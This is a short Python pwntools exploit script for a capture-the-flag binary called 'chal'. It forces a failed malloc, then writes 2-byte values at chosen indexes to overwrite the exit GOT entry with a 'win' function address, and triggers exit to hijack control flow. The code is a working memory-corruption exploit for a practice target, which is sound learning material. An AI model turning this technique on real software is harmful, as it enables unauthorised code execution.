from pwn import *
import struct
#from config import REMOTE_ADDR, REMOTE_PORT

REMOTE = 0 # Change to 1 to run the exploit on the remote instance

e = context.binary = ELF("./chal")

if REMOTE:
    p = remote(REMOTE_ADDR, REMOTE_PORT)
else:
    p = e.process()
    context.terminal = ['tmux', 'splitw', '-h']
    gdb.attach(p, """
        b main
        b 0x000000000040148d
        continue
    """)

io = r = p # use whichever you like for communication

def create_numbers(num_numbers):
    p.sendlineafter(b"How many numbers? ", str(num_numbers).encode())

def add_number(idx, value, another):
    p.sendlineafter(b"Which idx to set? ", str(idx).encode())
    p.sendlineafter(b"Value to set? ", str(value).encode())
    if another:
        choice = "y"
    else:
        choice = "n"
    
    p.sendlineafter(b"Another? ", choice)


win = e.sym.win

# addr of exit, but need to div 2 because each index is worth 2 bytes (short)
ex = 0x403480 // 2

# cause malloc to fail
create_numbers(100000000000)

bs = p64(win)
addr, num = 0,0

# Overwrite exit
for i in range(0, 8,2):
    num = struct.unpack('<H', bs[i:i+2])[0]
    addr = i//2 + ex
    add_number(addr, num, True)

# trigger exit
add_number(addr, num, False)
